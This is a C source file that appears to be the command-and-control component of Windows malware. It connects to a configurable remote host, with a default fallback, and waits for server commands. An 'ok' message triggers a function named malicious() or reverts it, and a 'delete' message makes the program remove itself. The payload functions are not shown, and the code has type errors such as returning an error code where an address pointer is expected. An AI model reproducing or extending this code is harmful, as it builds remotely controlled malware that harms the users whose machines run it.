#include <Winsock2.h>
#include <Ws2tcpip.h>

#include <shlwapi.h>

#pragma comment(lib, "Ws2_32.lib")

extern wchar_t HOST[1024];
extern wchar_t PORT[1024];

extern wchar_t DEFAULT_HOST[1024];
extern wchar_t DEFAULT_PORT[1024];

int CALLED = 0;

struct sockaddr_in* getAddress(int *addrLen)
{
    int errcode = -1;

    struct addrinfo* result = NULL;
    struct addrinfo* ptr = NULL;
    struct addrinfo hints;

	struct sockaddr_in* addr = NULL;

    ZeroMemory(&hints, sizeof(hints));

    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (GetAddrInfoW((PCWSTR)HOST, (PCWSTR)PORT, &hints, &result) != 0)
    {
        errcode = WSAGetLastError();
        freeaddrinfo(result);
        WSACleanup();
        return errcode;
    }

    for (ptr = result; ptr != NULL; ptr = ptr->ai_next)
    {
        if (ptr->ai_family == AF_INET)
        {
			addr = (struct sockaddr_in*)ptr->ai_addr;

            if (addr != NULL)
            {
                *addrLen = ptr->ai_addrlen;
                errcode = 0;
            }
        }
    }

    //freeaddrinfo(result);
    return addr;
}

int connect_socket(SOCKET s)
{
    int errcode = -1;
    struct sockaddr_in* sockaddr_ipv4;
    int addrLen = 0;

	sockaddr_ipv4 = getAddress(&addrLen);
    if (SOCKET_ERROR == (connect(s, sockaddr_ipv4, addrLen)))
    {
        errcode = WSAGetLastError();
        WSACleanup();

        if ((StrCmpW(HOST, DEFAULT_HOST) != 0) || (StrCmpW(PORT, DEFAULT_PORT)))
        {
            StrCpyW(HOST, DEFAULT_HOST);
            StrCpyW(PORT, DEFAULT_PORT);

            winsock_init();
        }
        
        return errcode;
    }

    /* char buff[512] = "GET / HTTP/1.1";

    if (SOCKET_ERROR == (send(s, (char*)&buff, strlen(buff), 0)))
    {
        errcode = WSAGetLastError();
        WSACleanup();
        return errcode;
    }*/

    int actual_len = 1;
    char recvbuf[512] = { 0 };

    while (actual_len > 0)
    {
        if (SOCKET_ERROR == (actual_len = recv(s, (char*)&recvbuf, 512, 0)))
        {
            errcode = WSAGetLastError();
            closesocket(s);
            WSACleanup();
            return errcode;
        }

        if (strcmp(recvbuf, "ok") == 0)
        {
            if (CALLED == 0)
            {
                CALLED = 1;
                malicious();
            }
            else
            {
                CALLED = 0;
                revertBack();
            }
        }
        else if (strcmp(recvbuf, "delete") == 0)
        {
            deleteSelf();
        }
    }

    shutdown(s, SD_BOTH);
    closesocket(s);
    WSACleanup();
    errcode = 0;

    return errcode;
}

int winsock_init()
{
    int errcode = -1;

    WSADATA ws;

    if (FAILED(WSAStartup(MAKEWORD(1, 1), &ws)))
    {
        errcode = WSAGetLastError();
        WSACleanup();
        return errcode;
    }

    SOCKET s;

    if (INVALID_SOCKET == (s = socket(AF_INET, SOCK_STREAM, 0)))
    {
        errcode = WSAGetLastError();
        WSACleanup();
        return errcode;
    }

    errcode = connect_socket(s);
    WSACleanup();

    return errcode;
}